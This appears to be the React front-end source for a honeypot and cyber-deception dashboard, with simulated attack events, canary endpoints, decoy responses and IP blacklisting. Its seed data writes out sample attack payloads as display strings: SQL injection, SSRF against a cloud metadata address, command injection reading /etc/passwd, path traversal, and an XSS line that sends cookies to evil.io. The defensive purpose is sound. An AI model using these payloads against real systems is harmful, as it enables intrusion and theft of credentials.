/*
 * ═══════════════════════════════════════════════════════════════════
 *  VOID // SENTINEL  —  React Application Logic
 *  Team ownership: Frontend / Engineering team
 *
 *  This file is loaded as type="text/babel" so JSX works directly
 *  without a build step. Every component is in this one file.
 *
 *  Sections:
 *    A. Constants & seed data
 *    B. Helper utilities
 *    C. Shared sub-components
 *         Icon, SeverityBadge, MetricCard, ToggleSwitch
 *    D. Right-panel components
 *         CanaryPanel, IntrusionInspector
 *    E. Main App component
 * ═══════════════════════════════════════════════════════════════════
 */

/* ── A. Constants & Seed Data ──────────────────────────────────── */

const CANARY_ENDPOINTS = [
  { path: '/.env',                label: '.env',               id: 'env' },
  { path: '/admin/dump.sql',      label: 'admin/dump.sql',     id: 'sql' },
  { path: '/api/v1/auth/tokens',  label: 'api/v1/auth/tokens', id: 'api' },
  { path: '/wp-login.php',        label: 'wp-login.php',       id: 'wp'  },
  { path: '/.git/config',         label: '.git/config',        id: 'git' },
];

const GEO_TAGS = [
  'RU-MOW', 'CN-SHA', 'KP-FNJ', 'IR-THR', 'NG-LAG',
  'BR-SAO', 'UA-KBP', 'RO-BUC', 'VN-HAN', 'TR-IST',
  'US-TOR (VPN)', 'NL-AMS (TOR EXIT)', 'DE-FRA (Proxy)',
];

const ATTACK_TEMPLATES = [
  { attack_type: 'Decoy Route Access',    endpoint: '/.env',                severity: 'CRITICAL', payload: 'GET /.env HTTP/1.1\nHost: target.void\nUser-Agent: Python-urllib/3.11' },
  { attack_type: 'SQL Injection Probe',   endpoint: '/admin/dump.sql',      severity: 'CRITICAL', payload: "GET /admin/dump.sql?id=1' OR 1=1--" },
  { attack_type: 'Token Harvest Attempt', endpoint: '/api/v1/auth/tokens',  severity: 'CRITICAL', payload: 'POST /api/v1/auth/tokens\n{"grant_type":"password","username":"admin"}' },
  { attack_type: 'Admin Panel Recon',     endpoint: '/admin/dashboard',     severity: 'HIGH',     payload: 'GET /admin/dashboard HTTP/1.1' },
  { attack_type: 'Wordpress Exploit Scan',endpoint: '/wp-login.php',        severity: 'CRITICAL', payload: "POST /wp-login.php\nlog=admin&pwd=' OR 1=1 --" },
  { attack_type: 'Blind SSRF Probe',      endpoint: '/api/v1/fetch',        severity: 'HIGH',     payload: 'POST /api/v1/fetch\n{"url":"http://169.254.169.254/latest/meta-data/"}' },
  { attack_type: 'RCE Payload Injection', endpoint: '/cgi-bin/exec.sh',     severity: 'CRITICAL', payload: 'GET /cgi-bin/exec.sh?cmd=;cat+/etc/passwd' },
  { attack_type: 'Directory Traversal',   endpoint: '/static/../../../etc/passwd', severity: 'CRITICAL', payload: 'GET /static/../../../etc/passwd HTTP/1.1' },
  { attack_type: 'Credential Stuffing',   endpoint: '/api/v1/login',        severity: 'HIGH',     payload: 'POST /api/v1/login\n{"email":"admin@void.local","password":"P@ssw0rd123"}' },
  { attack_type: 'XSS Injection Attempt', endpoint: '/search',              severity: 'HIGH',     payload: "GET /search?q=<script>fetch('https://evil.io/steal?c='+document.cookie)</script>" },
  { attack_type: 'Git Exposure Scan',     endpoint: '/.git/config',         severity: 'CRITICAL', payload: 'GET /.git/config HTTP/1.1\nUser-Agent: gitScanner/2.1' },
  { attack_type: 'Healthcheck',           endpoint: '/api/health',          severity: 'INFO',     payload: 'GET /api/health HTTP/1.1' },
];

const ACTIONS = {
  CRITICAL: ['Decoy Served & IP Logged', 'Honeypot Trap Engaged', 'Canary Token Fired • IP Blacklisted', 'Fake Credentials Served • Alert Raised'],
  HIGH:     ['Throttle Applied • Flagged', 'Rate-Limited • Logged for Review', 'CAPTCHA Wall Injected'],
  INFO:     ['Passthrough Logged', 'Clean — Telemetry Recorded', 'Benign — No Action'],
};

const SAMPLE_EVENTS = [
  { id:'evt_100', timestamp:'2026-10-15T11:29:51Z', client_ip:'185.220.101.47', attack_type:'Env File Exfil Attempt',    endpoint:'/.env',               payload:'GET /.env HTTP/1.1\nHost: target.void\nUser-Agent: Python-urllib/3.11', severity:'CRITICAL', action_taken:'Honeypot Trap Engaged',                  geo:'RU-MOW' },
  { id:'evt_101', timestamp:'2026-10-15T11:29:44Z', client_ip:'45.141.84.120',  attack_type:'SQL Injection Probe',        endpoint:'/admin/dump.sql',     payload:"GET /admin/dump.sql?id=1' OR 1=1--",            severity:'CRITICAL', action_taken:'Decoy Served & IP Logged',               geo:'CN-SHA' },
  { id:'evt_102', timestamp:'2026-10-15T11:29:38Z', client_ip:'198.98.56.12',   attack_type:'Token Harvest Attempt',      endpoint:'/api/v1/auth/tokens', payload:'POST /api/v1/auth/tokens\n{"grant_type":"password","username":"admin"}', severity:'CRITICAL', action_taken:'Fake Credentials Served • Alert Raised', geo:'KP-FNJ' },
  { id:'evt_103', timestamp:'2026-10-15T11:29:22Z', client_ip:'172.16.0.43',    attack_type:'Admin Panel Recon',          endpoint:'/admin/dashboard',    payload:'GET /admin/dashboard HTTP/1.1',                  severity:'HIGH',     action_taken:'Throttle Applied • Flagged',             geo:'TR-IST' },
  { id:'evt_104', timestamp:'2026-10-15T11:29:10Z', client_ip:'10.0.0.112',     attack_type:'Healthcheck',                endpoint:'/api/health',         payload:'GET /api/health HTTP/1.1',                      severity:'INFO',     action_taken:'Passthrough Logged',                     geo:'DE-FRA (Proxy)' },
  { id:'evt_105', timestamp:'2026-10-15T11:28:55Z', client_ip:'91.234.56.78',   attack_type:'Git Exposure Scan',          endpoint:'/.git/config',        payload:'GET /.git/config HTTP/1.1\nUser-Agent: gitScanner/2.1', severity:'CRITICAL', action_taken:'Canary Token Fired • IP Blacklisted',  geo:'IR-THR' },
];

/* ── B. Helper Utilities ────────────────────────────────────────── */

let evtCounter = 200;
const rand     = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
const pickFrom = arr     => arr[rand(0, arr.length - 1)];
const randIP   = ()      => `${rand(1,254)}.${rand(0,255)}.${rand(0,255)}.${rand(0,255)}`;

const fmtTime = iso => new Date(iso).toISOString().substr(11, 8);

const makeEvent = (overrides = {}) => {
  const tmpl = pickFrom(ATTACK_TEMPLATES);
  const sev  = overrides.severity || tmpl.severity;
  return {
    id:          `evt_${evtCounter++}`,
    timestamp:   new Date().toISOString(),
    client_ip:   randIP(),
    attack_type: tmpl.attack_type,
    endpoint:    tmpl.endpoint,
    payload:     tmpl.payload,
    severity:    sev,
    action_taken: pickFrom(ACTIONS[sev] || ACTIONS.INFO),
    geo:         pickFrom(GEO_TAGS),
    isNew:       true,
    ...overrides,
  };
};

const computeCanaryHits = (events) => {
  const counts = {};
  CANARY_ENDPOINTS.forEach(c => { counts[c.id] = 0; });
  events.forEach(e => {
    CANARY_ENDPOINTS.forEach(c => {
      if (e.endpoint.startsWith(c.path)) counts[c.id]++;
    });
  });
  return counts;
};

/* ── C. Shared Sub-Components ───────────────────────────────────── */

/* Inline SVG icon set — no external dependency needed */
const Icon = ({ name, size = 16, className = '' }) => {
  const paths = {
    shield:          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>,
    zap:             <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>,
    eye:             <><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></>,
    search:          <><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></>,
    x:               <><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></>,
    chevrondown:     <polyline points="6 9 12 15 18 9"/>,
    ban:             <><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></>,
    activity:        <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>,
    cpu:             <><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></>,
    terminal:        <><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></>,
    play:            <polygon points="5 3 19 12 5 21 5 3"/>,
    pause:           <><rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/></>,
    crosshair:       <><circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/></>,
    alerttriangle:   <><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></>,
    info:            <><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></>,
  };
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="none"
         stroke="currentColor" strokeWidth="2" strokeLinecap="round"
         strokeLinejoin="round" className={className}>
      {paths[name]}
    </svg>
  );
};

/* Coloured pill badge for event severity */
const SeverityBadge = ({ sev }) => {
  const cfg = {
    CRITICAL: 'bg-rose-950/60 text-rose-400 border border-rose-700/60 crit-flicker',
    HIGH:     'bg-amber-950/50 text-amber-400 border border-amber-700/50',
    INFO:     'bg-emerald-950/40 text-emerald-400 border border-emerald-700/40',
  };
  const icons = { CRITICAL: 'alerttriangle', HIGH: 'zap', INFO: 'info' };
  return (
    <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded text-xs font-semibold tracking-wider ${cfg[sev] || cfg.INFO}`}>
      <Icon name={icons[sev] || 'info'} size={10}/>
      {sev}
    </span>
  );
};

/* KPI summary card */
const MetricCard = ({ label, value, sub, color, icon, glow }) => {
  const C = {
    violet:  { border:'border-violet-700/40',  bg:'bg-violet-950/20',  text:'text-violet-400',  dot:'bg-violet-500' },
    rose:    { border:'border-rose-700/40',    bg:'bg-rose-950/20',    text:'text-rose-400',    dot:'bg-rose-500 threat-dot' },
    amber:   { border:'border-amber-700/40',   bg:'bg-amber-950/20',   text:'text-amber-400',   dot:'bg-amber-500' },
    emerald: { border:'border-emerald-700/40', bg:'bg-emerald-950/20', text:'text-emerald-400', dot:'bg-emerald-500' },
  }[color] || {};

  return (
    <div className={`relative rounded-xl border ${C.border} ${C.bg} grid-bg p-5 overflow-hidden transition-all duration-300 hover:border-opacity-70`}>
      <div className="absolute top-0 right-0 w-16 h-16 opacity-5 rounded-bl-full bg-current"/>
      <div className="flex items-start justify-between mb-3">
        <div className={`p-2 rounded-lg bg-black/40 ${C.text}`}><Icon name={icon} size={18}/></div>
        <div className={`w-2 h-2 rounded-full ${C.dot} mt-1`}/>
      </div>
      <div className={`text-3xl font-bold tracking-tight ${C.text} ${glow ? `glow-${color}` : ''} mb-1`}>{value}</div>
      <div className="text-xs text-zinc-500 uppercase tracking-widest leading-tight">{label}</div>
      {sub && <div className={`text-xs mt-1.5 ${C.text} opacity-60`}>{sub}</div>}
    </div>
  );
};

/* Sliding on/off toggle */
const ToggleSwitch = ({ checked, onChange }) => (
  <button onClick={() => onChange(!checked)} className="flex items-center gap-3 focus:outline-none">
    <span className="text-xs text-zinc-500 uppercase tracking-widest">Matrix:</span>
    <div className={`relative w-12 h-6 rounded-full toggle-track border
      ${checked ? 'bg-violet-600/40 border-violet-500/60' : 'bg-zinc-900 border-zinc-700'}`}>
      <div className={`absolute top-0.5 w-5 h-5 rounded-full toggle-thumb shadow-lg
        ${checked ? 'translate-x-6 bg-violet-400 shadow-glow-violet' : 'translate-x-0.5 bg-zinc-500'}`}/>
    </div>
    <span className={`text-xs font-bold tracking-widest transition-all duration-200
      ${checked ? 'text-violet-400 glow-violet' : 'text-zinc-600'}`}>
      {checked ? 'ACTIVE' : 'BYPASSED'}
    </span>
  </button>
);

/* ── D. Right-Panel Components ──────────────────────────────────── */

/* Live canary endpoint hit tracker */
const CanaryPanel = ({ events }) => {
  const hits   = computeCanaryHits(events);
  const maxHit = Math.max(...Object.values(hits), 1);

  return (
    <div className="rounded-xl border border-zinc-800/80 bg-zinc-950/60 p-4">
      <div className="flex items-center gap-2 mb-4">
        <div className="text-amber-400"><Icon name="crosshair" size={14}/></div>
        <span className="text-xs font-semibold uppercase tracking-widest text-amber-400">VOID Canary Endpoints</span>
        <div className="ml-auto flex items-center gap-1">
          <div className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse"/>
          <span className="text-xs text-zinc-500">LIVE</span>
        </div>
      </div>

      <div className="space-y-3">
        {CANARY_ENDPOINTS.map(c => {
          const count = hits[c.id] || 0;
          const pct   = Math.round((count / maxHit) * 100);
          const isHot = count > 0;
          return (
            <div key={c.id}>
              <div className="flex items-center justify-between mb-1">
                <div className="flex items-center gap-1.5">
                  <div className={`w-1.5 h-1.5 rounded-full ${isHot ? 'bg-rose-500 threat-dot' : 'bg-zinc-600'}`}/>
                  <span className={`text-xs font-mono ${isHot ? 'text-zinc-300' : 'text-zinc-500'}`}>/{c.label}</span>
                </div>
                <span className={`text-xs font-bold font-mono ${isHot ? 'text-rose-400 glow-rose' : 'text-zinc-600'}`}>
                  {count} hits
                </span>
              </div>
              <div className="h-1.5 bg-zinc-900 rounded-full overflow-hidden">
                <div
                  className={`h-full rounded-full canary-bar ${isHot ? 'bg-gradient-to-r from-rose-700 to-rose-500' : 'bg-zinc-800'}`}
                  style={{ width: `${pct}%` }}
                />
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
};

/* Click-a-row inspector showing full event detail */
const DECOY_RESPONSES = {
  '/.env':               'DB_PASSWORD=v01d_h0n3yp0t_FAKE\nSECRET_KEY=CANARY_TOKEN_4a9f\nAPP_ENV=production',
  '/admin/dump.sql':     '-- VOID DECOY SQL DUMP v1.0\n-- No real data. Your IP has been logged.\n-- Access attempt reported.',
  '/api/v1/auth/tokens': '{"token":"CANARY_eyJhbGciOi...FAKE","expires_in":0,"type":"honeypot"}',
  '/wp-login.php':       'WordPress login form served (synthetic). Credentials captured and reported.',
  '/.git/config':        '[core]\n\trepositoryformatversion = CANARY\n[remote "origin"]\n\turl = void://honeypot/trap.git',
};

const IntrusionInspector = ({ event, onBlacklist, blacklisted }) => {
  if (!event) {
    return (
      <div className="rounded-xl border border-zinc-800/80 bg-zinc-950/60 p-4 flex flex-col items-center justify-center min-h-[200px] text-center">
        <div className="text-zinc-700 mb-2"><Icon name="crosshair" size={32}/></div>
        <p className="text-xs text-zinc-600 uppercase tracking-widest">Select a threat event<br/>to inspect</p>
      </div>
    );
  }

  const isBlacklisted = blacklisted.has(event.client_ip);
  const sevColor = { CRITICAL:'text-rose-400', HIGH:'text-amber-400', INFO:'text-emerald-400' }[event.severity] || 'text-zinc-400';
  const decoy = DECOY_RESPONSES[event.endpoint] || 'VOID synthetic decoy payload served. No real data exposed.';

  const InfoRow = ({ label, children }) => (
    <div className="flex items-start gap-2">
      <span className="text-zinc-600 w-20 shrink-0 text-xs">{label}</span>
      <span className="text-zinc-400 mr-1 text-xs">›</span>
      <div className="flex-1 min-w-0 text-xs">{children}</div>
    </div>
  );

  return (
    <div className="rounded-xl border border-violet-800/50 bg-violet-950/10 p-4">
      <div className="flex items-center gap-2 mb-3">
        <div className="text-violet-400"><Icon name="eye" size={14}/></div>
        <span className="text-xs font-semibold uppercase tracking-widest text-violet-400">Intrusion Inspector</span>
        <SeverityBadge sev={event.severity}/>
      </div>

      <div className="space-y-2">
        <InfoRow label="Origin IP"><span className="font-mono text-zinc-200">{event.client_ip}</span></InfoRow>
        <InfoRow label="Geo Tag"><span className="text-amber-400 font-mono">{event.geo || 'UNKNOWN'}</span></InfoRow>
        <InfoRow label="Vector"><span className={`font-semibold ${sevColor}`}>{event.attack_type}</span></InfoRow>
        <InfoRow label="Endpoint"><span className="font-mono text-rose-300">{event.endpoint}</span></InfoRow>
        <InfoRow label="Time"><span className="font-mono text-zinc-400">{fmtTime(event.timestamp)}</span></InfoRow>
      </div>

      <div className="mt-3">
        <p className="text-zinc-600 text-xs uppercase tracking-widest mb-1">Payload Captured</p>
        <pre className="bg-black/60 border border-zinc-800 rounded-lg p-2 text-xs text-amber-300/80 font-mono overflow-x-auto leading-relaxed whitespace-pre-wrap break-all">
{event.payload}
        </pre>
      </div>

      <div className="mt-3">
        <p className="text-zinc-600 text-xs uppercase tracking-widest mb-1">VOID Decoy Served</p>
        <pre className="bg-black/60 border border-emerald-900/40 rounded-lg p-2 text-xs text-emerald-400/80 font-mono overflow-x-auto leading-relaxed whitespace-pre-wrap break-all">
{decoy}
        </pre>
      </div>

      <button
        onClick={() => {
          onBlacklist(event.client_ip);
          fetch('http://127.0.0.1:8001/api/blacklist', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ip: event.client_ip}),
          }).catch(() => {/* bridge offline — local blacklist still applied */});
        }}
        disabled={isBlacklisted}
        className={`mt-3 w-full flex items-center justify-center gap-2 py-2 rounded-lg text-xs font-semibold
          uppercase tracking-widest transition-all duration-200
          ${isBlacklisted
            ? 'bg-zinc-900 text-zinc-600 border border-zinc-800 cursor-not-allowed'
            : 'bg-rose-950/60 hover:bg-rose-900/60 text-rose-400 border border-rose-800/60 hover:border-rose-600 hover:shadow-glow-rose cursor-pointer'}`}
      >
        <Icon name="ban" size={13}/>
        {isBlacklisted ? 'IP Already Blacklisted' : 'Blacklist IP'}
      </button>
    </div>
  );
};

/* ── E. Main App Component ──────────────────────────────────────── */

const { useState, useEffect, useRef } = React;

const App = () => {
  const [events,       setEvents]      = useState(SAMPLE_EVENTS);
  const [matrixActive, setMatrix]      = useState(true);
  const [selected,     setSelected]    = useState(null);
  const [blacklisted,  setBlacklisted] = useState(new Set());
  const [searchIP,     setSearchIP]    = useState('');
  const [sevFilter,    setSevFilter]   = useState('All');
  const [paused,       setPaused]      = useState(false);
  const [flashTick,    setFlashTick]   = useState(0);

  const feedRef    = useRef(null);
  const intervalRef= useRef(null);

  /* KPI derived values */
  const honeytokens = events.filter(e => e.severity === 'CRITICAL').length;
  const quarantined = Math.min(honeytokens, 31) + blacklisted.size;

  /* Bridge API base URL — Person 3 FastAPI bridge on port 8001 */
  const BRIDGE = 'http://127.0.0.1:8001';

  /* Track seen event IDs to avoid duplicates when polling */
  const seenIds = useRef(new Set(SAMPLE_EVENTS.map(e => e.id)));

  /* Poll bridge API for live events every 3.5 s.
     Falls back to a mock event when bridge is unreachable (demo mode). */
  useEffect(() => {
    const poll = async () => {
      try {
        const res = await fetch(`${BRIDGE}/api/events?limit=100`);
        if (!res.ok) throw new Error('bridge offline');
        const liveEvents = await res.json();
        if (!liveEvents.length) return;
        const newEvts = liveEvents.filter(e => !seenIds.current.has(e.id));
        if (!newEvts.length) return;
        newEvts.forEach(e => seenIds.current.add(e.id));
        const tagged = newEvts.map(e => ({ ...e, isNew: true }));
        setEvents(prev => [...tagged, ...prev].slice(0, 500));
        setFlashTick(n => n + 1);
        if (feedRef.current) feedRef.current.scrollTop = 0;
      } catch (_) {
        /* Bridge unreachable — keep demo alive with mock events */
        if (!paused) {
          const ev = makeEvent();
          setEvents(prev => [ev, ...prev].slice(0, 250));
          setFlashTick(n => n + 1);
          if (feedRef.current) feedRef.current.scrollTop = 0;
        }
      }
    };

    if (!paused) {
      poll(); // immediate first poll on mount / resume
      intervalRef.current = setInterval(poll, 3500);
    }
    return () => clearInterval(intervalRef.current);
  }, [paused]);

  /* Clear "isNew" flag after flash animation completes */
  useEffect(() => {
    const t = setTimeout(() => setEvents(prev => prev.map(e => ({ ...e, isNew: false }))), 2200);
    return () => clearTimeout(t);
  }, [flashTick]);

  /* Inject a forced CRITICAL event for demo */
  const triggerSimulated = () => {
    const ev = makeEvent({ severity: 'CRITICAL' });
    setEvents(prev => [ev, ...prev].slice(0, 250));
    if (feedRef.current) feedRef.current.scrollTop = 0;
  };

  /* Filtered view */
  const filteredEvents = events.filter(e => {
    const matchSearch = !searchIP
      || e.client_ip.includes(searchIP)
      || e.endpoint.includes(searchIP);
    const matchSev =
      sevFilter === 'All'                              ||
      (sevFilter === 'Critical' && e.severity === 'CRITICAL') ||
      (sevFilter === 'Warning'  && e.severity === 'HIGH')     ||
      (sevFilter === 'Clean'    && e.severity === 'INFO');
    return matchSearch && matchSev;
  });

  /* Row colour helpers */
  const rowHover = { CRITICAL:'hover:bg-rose-950/20', HIGH:'hover:bg-amber-950/20', INFO:'hover:bg-emerald-950/10' };
  const vecColor = { CRITICAL:'text-rose-400', HIGH:'text-amber-400', INFO:'text-emerald-400' };

  return (
    <div className={`min-h-screen bg-black text-zinc-200 font-mono flex flex-col transition-all duration-500 ${!matrixActive ? 'brightness-75 saturate-50' : ''}`}>

      {/* ══ TOP NAV ══════════════════════════════════════════════ */}
      <nav className="sticky top-0 z-50 bg-zinc-950/95 backdrop-blur-xl border-b border-zinc-800/80 px-4 py-3">
        <div className="max-w-screen-2xl mx-auto flex items-center gap-4">

          {/* Brand */}
          <div className="flex items-center gap-3 min-w-0">
            <div className="relative">
              <div className="w-8 h-8 rounded-lg bg-violet-900/60 border border-violet-600/50 flex items-center justify-center shadow-glow-violet">
                <Icon name="shield" size={16} className="text-violet-400"/>
              </div>
              <div className="absolute -top-0.5 -right-0.5 w-2 h-2 rounded-full bg-rose-500 threat-dot"/>
            </div>
            <div>
              <div className="text-sm font-bold tracking-[0.2em] text-violet-400 glow-violet leading-none">VOID // SENTINEL</div>
              <div className="text-xs text-zinc-600 tracking-widest leading-none mt-0.5">Autonomous Cyber-Deception &amp; Honeytoken Defense</div>
            </div>
            <div className="hidden sm:flex items-center gap-1.5 ml-2 bg-emerald-950/40 border border-emerald-800/50 rounded-full px-3 py-1">
              <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 radar-dot"/>
              <span className="text-xs text-emerald-400 uppercase tracking-widest font-semibold">TRIPWIRES ACTIVE · LISTENING</span>
            </div>
          </div>

          {/* Center toggle */}
          <div className="flex-1 flex items-center justify-center">
            <div className="flex items-center gap-3 bg-zinc-900/80 border border-zinc-800 rounded-xl px-4 py-2">
              <span className="text-xs text-zinc-500 uppercase tracking-widest hidden md:block">VOID Defense</span>
              <ToggleSwitch checked={matrixActive} onChange={setMatrix}/>
            </div>
          </div>

          {/* Right controls */}
          <div className="flex items-center gap-2 shrink-0">
            <button
              onClick={() => setPaused(p => !p)}
              className={`flex items-center gap-1.5 px-3 py-2 rounded-lg border text-xs font-semibold uppercase tracking-wider transition-all duration-200
                ${paused
                  ? 'bg-emerald-950/40 border-emerald-800/60 text-emerald-400 hover:bg-emerald-900/40'
                  : 'bg-zinc-900/80 border-zinc-700 text-zinc-400 hover:border-zinc-500'}`}
            >
              <Icon name={paused ? 'play' : 'pause'} size={12}/>
              <span className="hidden sm:inline">{paused ? 'Resume' : 'Pause'}</span>
            </button>
            <button
              onClick={triggerSimulated}
              className="flex items-center gap-2 px-4 py-2 rounded-lg bg-rose-950/50 hover:bg-rose-900/60
                         border border-rose-700/60 hover:border-rose-500 text-rose-400
                         text-xs font-bold uppercase tracking-widest transition-all duration-200 hover:shadow-glow-rose"
            >
              <Icon name="zap" size={13}/>
              <span className="hidden md:inline">Trigger Simulated Intrusion</span>
              <span className="md:hidden">INJECT</span>
            </button>
          </div>
        </div>
      </nav>

      {/* Bypassed warning banner */}
      {!matrixActive && (
        <div className="bg-amber-950/40 border-b border-amber-700/50 px-4 py-2 text-center">
          <span className="text-amber-400 text-xs font-bold uppercase tracking-widest">
            WARNING — VOID DEFENSE MATRIX BYPASSED — HONEYTOKENS INACTIVE
          </span>
        </div>
      )}

      {/* ══ MAIN CONTENT ══════════════════════════════════════════ */}
      <main className="flex-1 max-w-screen-2xl mx-auto w-full p-4 space-y-4">

        {/* KPI cards */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
          <MetricCard label="Inbound Telemetry Monitored"       value={events.length.toLocaleString()} sub="live stream"           color="violet"  icon="activity" glow/>
          <MetricCard label="Honeytokens Tripped / Traps Sprung" value={honeytokens.toLocaleString()}   sub="canary fires"          color="rose"    icon="zap"      glow/>
          <MetricCard label="Adversary IPs Quarantined"          value={quarantined}                    sub={`${blacklisted.size} manually blacklisted`} color="amber"   icon="ban"  glow/>
          <MetricCard label="Threat Interception Latency"        value="&lt; 4ms"                       sub="p99 response"          color="emerald" icon="cpu"      glow/>
        </div>

        {/* Main split — feed | inspector */}
        <div className="grid grid-cols-1 xl:grid-cols-[1fr_340px] gap-4">

          {/* ── Telemetry feed ── */}
          <div className="rounded-xl border border-zinc-800/80 bg-zinc-950/40 flex flex-col overflow-hidden">

            {/* Feed header / controls */}
            <div className="px-4 py-3 border-b border-zinc-800/80 bg-zinc-950/60 flex flex-col sm:flex-row sm:items-center gap-3">
              <div className="flex items-center gap-2">
                <div className="text-rose-400"><Icon name="terminal" size={14}/></div>
                <span className="text-xs font-semibold uppercase tracking-widest text-zinc-300">Real-Time Attack Telemetry Feed</span>
                <div className="w-1.5 h-1.5 rounded-full bg-rose-500 threat-dot"/>
              </div>
              <div className="flex items-center gap-2 sm:ml-auto flex-wrap">
                {/* IP / endpoint search */}
                <div className="relative">
                  <Icon name="search" size={12} className="absolute left-2 top-1/2 -translate-y-1/2 text-zinc-600"/>
                  <input
                    type="text" placeholder="Search IP or endpoint…" value={searchIP}
                    onChange={e => setSearchIP(e.target.value)}
                    className="bg-black/60 border border-zinc-800 rounded-lg pl-6 pr-7 py-1.5 text-xs text-zinc-300
                               placeholder-zinc-700 focus:outline-none focus:border-violet-600 w-44 transition-colors"
                  />
                  {searchIP && (
                    <button onClick={() => setSearchIP('')} className="absolute right-2 top-1/2 -translate-y-1/2 text-zinc-600 hover:text-zinc-400">
                      <Icon name="x" size={10}/>
                    </button>
                  )}
                </div>
                {/* Severity filter */}
                <div className="relative">
                  <select value={sevFilter} onChange={e => setSevFilter(e.target.value)}
                    className="appearance-none bg-black/60 border border-zinc-800 rounded-lg pl-3 pr-7 py-1.5
                               text-xs text-zinc-300 focus:outline-none focus:border-violet-600 cursor-pointer">
                    {['All','Critical','Warning','Clean'].map(s => <option key={s}>{s}</option>)}
                  </select>
                  <Icon name="chevrondown" size={11} className="absolute right-2 top-1/2 -translate-y-1/2 text-zinc-600 pointer-events-none"/>
                </div>
                <span className="text-xs text-zinc-600">{filteredEvents.length} events</span>
              </div>
            </div>

            {/* Scrollable table */}
            <div ref={feedRef} className="overflow-auto flex-1 relative terminal-scanlines"
                 style={{ maxHeight:'calc(100vh - 320px)', minHeight:'360px' }}>
              <table className="w-full text-xs border-collapse">
                <thead className="sticky top-0 z-10 bg-zinc-950/95 backdrop-blur-sm">
                  <tr className="border-b border-zinc-800/60">
                    {['Time','Severity','Origin IP','Targeted Route','Threat Vector','Countermeasure'].map(h => (
                      <th key={h} className="text-left px-4 py-2.5 text-zinc-600 uppercase tracking-widest font-semibold text-xs whitespace-nowrap">{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {filteredEvents.length === 0 && (
                    <tr><td colSpan={6} className="text-center py-12 text-zinc-700">No events match filter</td></tr>
                  )}
                  {filteredEvents.map(ev => (
                    <tr
                      key={ev.id}
                      onClick={() => setSelected(ev)}
                      className={`border-b border-zinc-900/60 cursor-pointer transition-all duration-150
                        ${ev.isNew ? 'flash-new' : ''}
                        ${rowHover[ev.severity] || ''}
                        ${selected?.id === ev.id ? 'bg-violet-950/30 border-l-2 border-l-violet-500' : ''}`}
                    >
                      <td className="px-4 py-2.5 font-mono text-zinc-500 whitespace-nowrap">{fmtTime(ev.timestamp)}</td>
                      <td className="px-4 py-2.5 whitespace-nowrap"><SeverityBadge sev={ev.severity}/></td>
                      <td className="px-4 py-2.5 font-mono whitespace-nowrap">
                        <span className={blacklisted.has(ev.client_ip) ? 'line-through text-zinc-700' : 'text-zinc-300'}>
                          {ev.client_ip}
                        </span>
                        {blacklisted.has(ev.client_ip) && <span className="ml-1 text-rose-800">X</span>}
                      </td>
                      <td className="px-4 py-2.5 font-mono max-w-[180px]">
                        <span className={`truncate block ${ev.severity === 'CRITICAL' ? 'text-rose-300' : 'text-zinc-400'}`}>{ev.endpoint}</span>
                      </td>
                      <td className="px-4 py-2.5 max-w-[160px]">
                        <span className={`truncate block font-semibold ${vecColor[ev.severity] || 'text-zinc-400'}`}>{ev.attack_type}</span>
                      </td>
                      <td className="px-4 py-2.5 max-w-[200px]">
                        <span className="truncate block text-zinc-500">{ev.action_taken}</span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Feed footer */}
            <div className="px-4 py-2 border-t border-zinc-900 bg-zinc-950/80 flex items-center gap-3">
              <div className="flex items-center gap-1.5">
                <div className={`w-1.5 h-1.5 rounded-full ${paused ? 'bg-zinc-600' : 'bg-emerald-400 radar-dot'}`}/>
                <span className="text-xs text-zinc-600">{paused ? 'PAUSED' : 'LIVE — auto-updating every 3.5s'}</span>
              </div>
              <span className="ml-auto text-xs text-zinc-700">
                {selected ? `Inspecting: ${selected.id}` : 'Click a row to inspect'}
              </span>
            </div>
          </div>

          {/* ── Right panel ── */}
          <div className="flex flex-col gap-4">
            <IntrusionInspector
              event={selected}
              onBlacklist={ip => setBlacklisted(prev => new Set([...prev, ip]))}
              blacklisted={blacklisted}
            />
            <CanaryPanel events={events}/>
          </div>
        </div>
      </main>

      {/* ══ FOOTER ════════════════════════════════════════════════ */}
      <footer className="border-t border-zinc-900 px-4 py-3 bg-zinc-950/80">
